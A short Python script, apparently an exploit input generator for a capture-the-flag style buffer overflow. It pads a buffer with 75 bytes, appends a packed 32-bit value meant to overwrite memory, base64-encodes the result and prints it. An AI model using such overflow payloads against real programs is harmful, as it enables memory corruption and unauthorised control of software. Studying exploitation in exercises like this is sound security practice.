
import sys
import struct
import base64

buf = b'ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo'
buf += struct.pack('<I', 381562499)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
